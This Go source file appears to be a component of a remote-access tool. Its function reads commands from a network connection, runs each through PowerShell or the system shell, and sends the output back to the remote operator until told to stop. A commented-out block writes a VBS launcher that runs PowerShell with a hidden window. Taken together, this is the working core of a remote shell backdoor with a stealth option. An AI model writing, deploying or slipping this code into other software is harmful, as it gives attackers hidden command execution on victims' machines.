package ExecuteSystemCommandWindows

import (
	"bufio"
	"bytes"
	"encoding/gob"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

type Command struct {
	CmdOutput string
	CmdError  string
}

func ExecuteCommandWindows(connection net.Conn) (err error) {

	reader := bufio.NewReader(connection)

	commandloop := true

	for commandloop {
		fmt.Println("\n[+] loop started")

		raw_user_input, err := reader.ReadString('\n')

		if err != nil {
			fmt.Println(err)
			continue
		}
		user_input := strings.TrimSpace(raw_user_input)
		if user_input == "stop" {
			commandloop = false

		} else {

			fmt.Println("[+] User Command: ", user_input)

			var cmd_instance *exec.Cmd

			if runtime.GOOS == "windows" {
				/*
					comm := "Dim shell,command" +
						"\ncommand = \"powershell.exe -nologo -command " + "\"" +
						"\nSet shell = CreateObject(\"WScript.Shell\")" +
						"\nshell.Run command,0"

					f, err := os.Create("comm.vbs")
					if err != nil {
						log.Fatal(err)
					}
					defer f.Close()
					_, err2 := f.WriteString(comm)
					if err2 != nil {
						log.Fatal(err2)
					}
				*/
				cmd_instance = exec.Command("powershell.exe", "/c", user_input)
			} else {
				cmd_instance = exec.Command(user_input)
			}

			var output bytes.Buffer
			var commandErr bytes.Buffer

			cmd_instance.Stdout = &output
			cmd_instance.Stderr = &commandErr

			err = cmd_instance.Run()
			if err != nil {
				fmt.Println(err)
			}

			cmdStruct := &Command{}

			cmdStruct.CmdOutput = output.String()
			cmdStruct.CmdError = commandErr.String()

			encoder := gob.NewEncoder(connection)

			err = encoder.Encode(cmdStruct)

			if err != nil {
				fmt.Println(err)
				continue
			}

		}

	}
	return
}
